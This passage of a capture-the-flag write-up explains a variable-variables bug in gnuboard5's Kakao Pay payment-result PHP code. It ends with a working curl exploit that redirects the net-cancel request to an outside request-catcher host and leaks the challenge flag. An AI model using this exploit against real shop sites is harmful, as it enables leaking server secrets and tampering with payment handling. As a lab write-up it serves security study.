</span></span><span style="display:flex;"><span>        <span style="color:#75715e">///$mKey = $util-&gt;makeHash(signKey, &#34;sha256&#34;); // 가맹점 확인을 위한 signKey를 해시값으로 변경 (SHA-256방식 사용)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $mKey <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#34;sha256&#34;</span>, $signKey);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 2.signature 생성
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $signParam[<span style="color:#e6db74">&#39;authToken&#39;</span>] <span style="color:#f92672">=</span> $authToken;  <span style="color:#75715e">// 필수
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $signParam[<span style="color:#e6db74">&#39;timestamp&#39;</span>] <span style="color:#f92672">=</span> $timestamp;  <span style="color:#75715e">// 필수
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// signature 데이터 생성 (모듈에서 자동으로 signParam을 알파벳 순으로 정렬후 NVP 방식으로 나열해 hash)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $signature <span style="color:#f92672">=</span> $util<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">makeSignature</span>($signParam);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 3.API 요청 전문 생성
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $authMap[<span style="color:#e6db74">&#39;mid&#39;</span>] <span style="color:#f92672">=</span> $default[<span style="color:#e6db74">&#39;de_kakaopay_mid&#39;</span>];   <span style="color:#75715e">// 필수
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $authMap[<span style="color:#e6db74">&#39;authToken&#39;</span>] <span style="color:#f92672">=</span> $authToken; <span style="color:#75715e">// 필수
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $authMap[<span style="color:#e6db74">&#39;signature&#39;</span>] <span style="color:#f92672">=</span> $signature; <span style="color:#75715e">// 필수
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $authMap[<span style="color:#e6db74">&#39;timestamp&#39;</span>] <span style="color:#f92672">=</span> $timestamp; <span style="color:#75715e">// 필수
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $authMap[<span style="color:#e6db74">&#39;charset&#39;</span>] <span style="color:#f92672">=</span> $charset;  <span style="color:#75715e">// default=UTF-8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $authMap[<span style="color:#e6db74">&#39;format&#39;</span>] <span style="color:#f92672">=</span> $format;  <span style="color:#75715e">// default=XML
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//if(null != notiUrl &amp;&amp; notiUrl.length() &gt; 0){
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//  authMap.put(&#34;notiUrl&#34;       ,notiUrl);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $httpUtil <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HttpClient</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// 4.API 통신 시작
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>            $authResultString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">processHTTP</span>($authUrl, $authMap)) {
</span></span><span style="display:flex;"><span>                $authResultString <span style="color:#f92672">=</span> $httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Http Connect Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> $httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">errormsg</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Http Connect Error&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//############################################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//5.API 통신결과 처리(***가맹점 개발수정***)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//############################################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>            $resultMap <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($authResultString, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $tid <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;tid&#39;</span>];
</span></span><span style="display:flex;"><span>            $oid <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^A-Za-z0-9\-_]/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $resultMap[<span style="color:#e6db74">&#39;MOID&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">/*************************  결제보안 추가 2016-05-18 START ****************************/</span>
</span></span><span style="display:flex;"><span>            $secureMap[<span style="color:#e6db74">&#39;mid&#39;</span>]       <span style="color:#f92672">=</span> $default[<span style="color:#e6db74">&#39;de_kakaopay_mid&#39;</span>];                         <span style="color:#75715e">//mid
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $secureMap[<span style="color:#e6db74">&#39;tstamp&#39;</span>]    <span style="color:#f92672">=</span> $timestamp;                   <span style="color:#75715e">//timestemp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $secureMap[<span style="color:#e6db74">&#39;MOID&#39;</span>]      <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;MOID&#39;</span>];           <span style="color:#75715e">//MOID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $secureMap[<span style="color:#e6db74">&#39;TotPrice&#39;</span>]  <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;TotPrice&#39;</span>];       <span style="color:#75715e">//TotPrice
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// signature 데이터 생성
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $secureSignature <span style="color:#f92672">=</span> $util<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">makeSignatureAuth</span>($secureMap);
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">/*************************  결제보안 추가 2016-05-18 END ****************************/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34; select * from </span><span style="color:#e6db74">{</span>$g5[<span style="color:#e6db74">&#39;g5_shop_order_data_table&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> where od_id = &#39;</span><span style="color:#e6db74">$oid</span><span style="color:#e6db74">&#39; &#34;</span>;
</span></span><span style="display:flex;"><span>            $row <span style="color:#f92672">=</span> <span style="color:#a6e22e">sql_fetch</span>($sql);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($row[<span style="color:#e6db74">&#39;dt_data&#39;</span>]) <span style="color:#f92672">?</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($row[<span style="color:#e6db74">&#39;dt_data&#39;</span>])) <span style="color:#f92672">:</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($data[<span style="color:#e6db74">&#39;pp_id&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $data[<span style="color:#e6db74">&#39;pp_id&#39;</span>]) {
</span></span><span style="display:flex;"><span>                $page_return_url  <span style="color:#f92672">=</span> <span style="color:#a6e22e">G5_SHOP_URL</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/personalpayform.php?pp_id=&#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;pp_id&#39;</span>];
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $page_return_url  <span style="color:#f92672">=</span> <span style="color:#a6e22e">G5_SHOP_URL</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/orderform.php&#39;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">get_session</span>(<span style="color:#e6db74">&#39;ss_direct&#39;</span>))
</span></span><span style="display:flex;"><span>                    $page_return_url <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;?sw_direct=1&#39;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#39;0000&#39;</span>, $resultMap[<span style="color:#e6db74">&#39;resultCode&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">strcmp</span>($secureSignature, $resultMap[<span style="color:#e6db74">&#39;authSignature&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) ) { <span style="color:#75715e">//결제보안 추가 2016-05-18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">/*                         * ***************************************************************************
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                 * 여기에 가맹점 내부 DB에 결제 결과를 반영하는 관련 프로그램 코드를 구현한다.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                  [중요!] 승인내용에 이상이 없음을 확인한 뒤 가맹점 DB에 해당건이 정상처리 되었음을 반영함
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                  처리중 에러 발생시 망취소를 한다.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                 * **************************************************************************** */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//최종결제요청 결과 성공 DB처리
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                $tno        <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;tid&#39;</span>];
</span></span><span style="display:flex;"><span>                $amount     <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;TotPrice&#39;</span>];
</span></span><span style="display:flex;"><span>                $app_time   <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;applDate&#39;</span>]<span style="color:#f92672">.</span>$resultMap[<span style="color:#e6db74">&#39;applTime&#39;</span>];
</span></span><span style="display:flex;"><span>                $pay_method <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;payMethod&#39;</span>];
</span></span><span style="display:flex;"><span>                $pay_type   <span style="color:#f92672">=</span> $PAY_METHOD[$pay_method];
</span></span><span style="display:flex;"><span>                $depositor  <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($resultMap[<span style="color:#e6db74">&#39;VACT_InputName&#39;</span>]) <span style="color:#f92672">?</span> $resultMap[<span style="color:#e6db74">&#39;VACT_InputName&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>                $commid     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>                $mobile_no  <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($resultMap[<span style="color:#e6db74">&#39;HPP_Num&#39;</span>]) <span style="color:#f92672">?</span> $resultMap[<span style="color:#e6db74">&#39;HPP_Num&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>                $app_no     <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;applNum&#39;</span>];
</span></span><span style="display:flex;"><span>                $card_name  <span style="color:#f92672">=</span> $CARD_CODE[$resultMap[<span style="color:#e6db74">&#39;CARD_Code&#39;</span>]];
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">switch</span>($pay_type) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;계좌이체&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        $bank_name <span style="color:#f92672">=</span> $BANK_CODE[$resultMap[<span style="color:#e6db74">&#39;ACCT_BankCode&#39;</span>]];
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> ($default[<span style="color:#e6db74">&#39;de_escrow_use&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>                            $escw_yn         <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Y&#39;</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;가상계좌&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        $bankname  <span style="color:#f92672">=</span> $BANK_CODE[$resultMap[<span style="color:#e6db74">&#39;VACT_BankCode&#39;</span>]];
</span></span><span style="display:flex;"><span>                        $account   <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;VACT_Num&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>$resultMap[<span style="color:#e6db74">&#39;VACT_Name&#39;</span>];
</span></span><span style="display:flex;"><span>                        $app_no    <span style="color:#f92672">=</span> $resultMap[<span style="color:#e6db74">&#39;VACT_Num&#39;</span>];
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> ($default[<span style="color:#e6db74">&#39;de_escrow_use&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>                            $escw_yn         <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Y&#39;</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                $inicis_pay_result <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(오류코드:&#39;</span><span style="color:#f92672">.</span>$resultMap[<span style="color:#e6db74">&#39;resultCode&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;) &#39;</span><span style="color:#f92672">.</span>$resultMap[<span style="color:#e6db74">&#39;resultMsg&#39;</span>];
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">alert</span>($s, $page_return_url);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 수신결과를 파싱후 resultCode가 &#34;0000&#34;이면 승인성공 이외 실패
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// 가맹점에서 스스로 파싱후 내부 DB 처리 후 화면에 결과 표시
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// payViewType을 popup으로 해서 결제를 하셨을 경우
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// 내부처리후 스크립트를 이용해 opener의 화면 전환처리를 하세요
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//throw new Exception(&#34;강제 Exception&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//    $s = $e-&gt;getMessage() . &#39; (오류코드:&#39; . $e-&gt;getCode() . &#39;)&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//####################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// 실패시 처리(***가맹점 개발수정***)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//####################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//---- db 저장 실패시 등 예외처리----//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $s <span style="color:#f92672">=</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; (오류코드:&#39;</span> <span style="color:#f92672">.</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getCode</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;)&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $s;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// 망취소 API
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>            $netcancelResultString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>; <span style="color:#75715e">// 망취소 요청 API url(고정, 임의 세팅 금지)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> ($httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">processHTTP</span>($netCancel, $authMap)) {
</span></span><span style="display:flex;"><span>                $netcancelResultString <span style="color:#f92672">=</span> $httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Http Connect Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> $httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">errormsg</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Http Connect Error&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;## 망취소 API 결과 ##&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $netcancelResultString <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;&amp;lt;&#34;</span>, $$netcancelResultString);
</span></span><span style="display:flex;"><span>            $netcancelResultString <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;&amp;gt;&#34;</span>, $$netcancelResultString);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span>, $netcancelResultString <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 취소 결과 확인
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php
</span></span></span></code></pre></div><p>The above code is the Kakao Pay payment logic. The important thing here is to use the try/catch statement, and the vulnerability occurs in the catch statement.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">processHTTP</span>($netCancel, $authMap)) {
</span></span><span style="display:flex;"><span>                $netcancelResultString <span style="color:#f92672">=</span> $httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Http Connect Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> $httpUtil<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">errormsg</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Http Connect Error&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;## 망취소 API 결과 ##&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $netcancelResultString <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;&amp;lt;&#34;</span>, $$netcancelResultString);
</span></span><span style="display:flex;"><span>            $netcancelResultString <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;&amp;gt;&#34;</span>, $$netcancelResultString);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span>, $netcancelResultString <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L175L189
</span></span></span></code></pre></div><p>The code above is executed when payment fails. Send a request to $netCancle using the $httpUtil-&gt;processHTTP() function, and store the return value in the $netcancelResultString variable. After that, I could see that variable variables were used twice in total by using the str_replace() function.</p>
<pre tabindex="0"><code>0. HTTP Request
$netcancelResultString = authToken

1. First str_replace()
$$netcancelResultString := $authToken = flag
$netcancelResultString = flag

2. Second str_replace()
$$netcancelResultString := $flag
$netcancelResultString = hsctf{~~~~}
</code></pre><p>If the string called authToken is included in the value of $netcancelResultString after http request as above When the str_replace() function is called for the first time, the string called flag will be saved as the value of the $netcancelResultString variable by variable variables. ($authToken is flag)</p>
<p>The second time the str_replace() function is called, the value of the $$netcancelResultString variable is the same as $flag, so the flag saved in common.php will be saved in the $netcancelResultString variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        $authUrl <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;authUrl&#39;</span>];    <span style="color:#75715e">// 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L33
</span></span></span></code></pre></div><p>In order to generate an error, pass an incorrect URL as the value of <code>authUrl</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span> ⚡ root@pocas  ~  curl http://1.230.253.91:5000/shop/kakaopay/pc_pay_result.php\?authUrl\=http://\&amp;netCancelUrl\=https://6668197e65f7e3f7f5b45ff55a909ddd.m.pipedream.net/\&amp;authToken\=flag\&amp;resultCode\=0000
</span></span><span style="display:flex;"><span>Http Connect Error
</span></span><span style="display:flex;"><span>Connection failed (0) Failed to parse address &#34;&#34;Http Connect Error (오류코드:0)## 망취소 API 결과 ##&lt;pre&gt;hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}&lt;/pre&gt;&lt;br&gt;&lt;br&gt;결제 에러가 일어났습니다. 에러 이유는 위와 같습니
</span></span><span style="display:flex;"><span>다.
</span></span></code></pre></div><p>Finally I got the flags by sending a request like above.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}
</span></span></code></pre></div><hr>
<p>Thanks to <a href="http://www.hayyimsecurity.com/">Hayyim Security</a> for making these fun challenges. It&rsquo;s been a long time since I studied a lot.</p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
